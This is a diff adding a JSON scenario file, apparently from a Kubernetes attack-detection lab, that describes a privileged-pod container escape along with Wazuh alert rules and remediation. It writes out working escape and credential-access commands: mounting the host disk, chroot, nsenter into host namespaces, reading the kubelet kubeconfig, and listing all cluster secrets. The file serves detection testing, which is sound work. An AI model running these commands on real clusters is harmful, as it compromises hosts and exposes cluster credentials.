@@ -1,0 +1,192 @@
+{
+  "id": "S4-01",
+  "name": "Privileged Pod Container Escape",
+  "category": "Kubernetes",
+  "version": "1.0",
+  "description": "Escape from privileged container to access host and cluster resources",
+  "difficulty": "Hard",
+  "real_world_relevance": "Kubernetes privilege escalation, container breakouts",
+
+  "mitre_attack": {
+    "tactics": ["Privilege Escalation", "Lateral Movement"],
+    "techniques": [
+      {"id": "T1611", "name": "Escape to Host"},
+      {"id": "T1610", "name": "Deploy Container"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["k8s-node"],
+    "network": "k8s_net",
+    "permissions": "Privileged pod or hostPID/hostNetwork"
+  },
+
+  "attack_flow": {
+    "description": "Attacker escapes privileged container to compromise the underlying host",
+    "diagram": [
+      "1. Attacker gains access to privileged pod",
+      "2. Attacker discovers privileged capabilities (SYS_ADMIN, etc.)",
+      "3. Attacker mounts host filesystem or uses nsenter",
+      "4. Attacker escapes to host context",
+      "5. Attacker accesses kubelet credentials and other pods"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Privilege Discovery",
+      "description": "Check container privileges and capabilities",
+      "actions": [
+        {
+          "type": "command",
+          "command": "cat /proc/1/status | grep Cap",
+          "expected_output_contains": ["CapEff:"]
+        },
+        {
+          "type": "command",
+          "command": "capsh --decode=$(cat /proc/1/status | grep CapEff | cut -f2)",
+          "description": "Decode effective capabilities"
+        }
+      ]
+    },
+    {
+      "name": "Host Access via Mount",
+      "description": "Mount host filesystem from privileged container",
+      "actions": [
+        {
+          "type": "command",
+          "command": "mount /dev/sda1 /mnt/host",
+          "description": "Mount host root filesystem"
+        },
+        {
+          "type": "command",
+          "command": "chroot /mnt/host",
+          "description": "Chroot to host filesystem"
+        }
+      ]
+    },
+    {
+      "name": "Container Escape via nsenter",
+      "description": "Use nsenter to escape to host namespace",
+      "critical": true,
+      "actions": [
+        {
+          "type": "command",
+          "command": "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
+          "description": "Enter host namespaces"
+        }
+      ]
+    },
+    {
+      "name": "Cluster Access",
+      "description": "Access kubelet and cluster resources from host",
+      "actions": [
+        {
+          "type": "command",
+          "command": "cat /var/lib/kubelet/kubeconfig",
+          "expected_output_contains": ["client-certificate", "client-key"]
+        },
+        {
+          "type": "command",
+          "command": "kubectl --kubeconfig=/var/lib/kubelet/kubeconfig get secrets -A",
+          "description": "List all cluster secrets"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "Process",
+      "description": "nsenter or chroot commands in container",
+      "wazuh_rule": "100750"
+    },
+    {
+      "type": "File Access",
+      "description": "Access to /var/lib/kubelet/ from container",
+      "wazuh_rule": "100751"
+    },
+    {
+      "type": "Process",
+      "description": "Mount commands for host devices",
+      "wazuh_rule": "100752"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100750",
+      "level": 14,
+      "description": "NHI: Container escape attempt via nsenter/chroot"
+    },
+    {
+      "rule_id": "100751",
+      "level": 12,
+      "description": "NHI: Kubelet credential access from container"
+    },
+    {
+      "rule_id": "100752",
+      "level": 14,
+      "description": "NHI: Host filesystem mount from container - ESCAPE ATTEMPT"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Terminate compromised pod immediately",
+      "Cordon and drain affected node",
+      "Rotate kubelet credentials"
+    ],
+    "long_term": [
+      "Never run privileged containers in production",
+      "Implement Pod Security Standards (Restricted)",
+      "Use seccomp and AppArmor profiles",
+      "Enable Kubernetes audit logging"
+    ],
+    "pod_security_policy": {
+      "apiVersion": "policy/v1beta1",
+      "kind": "PodSecurityPolicy",
+      "metadata": {"name": "restricted"},
+      "spec": {
+        "privileged": false,
+        "allowPrivilegeEscalation": false,
+        "hostNetwork": false,
+        "hostPID": false,
+        "hostIPC": false,
+        "runAsUser": {"rule": "MustRunAsNonRoot"},
+        "seLinux": {"rule": "RunAsAny"},
+        "fsGroup": {"rule": "RunAsAny"},
+        "volumes": ["configMap", "emptyDir", "secret"]
+      }
+    }
+  },
+
+  "demo_script": {
+    "container": "k8s-node",
+    "commands": [
+      "# Check container privileges",
+      "cat /proc/1/status | grep Cap",
+      "",
+      "# Simulate escape attempt",
+      "echo 'Would run: nsenter --target 1 --mount --uts --ipc --net --pid'",
+      "",
+      "# Check for kubelet access",
+      "ls -la /var/lib/kubelet/ 2>/dev/null || echo 'Kubelet not accessible (good!)'"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "Kubernetes Pod Security Standards",
+      "url": "https://kubernetes.io/docs/concepts/security/pod-security-standards/"
+    },
+    {
+      "title": "Container Escape Techniques",
+      "url": "https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/"
+    },
+    {
+      "title": "MITRE ATT&CK T1611",
+      "url": "https://attack.mitre.org/techniques/T1611/"
+    }
+  ]
+}
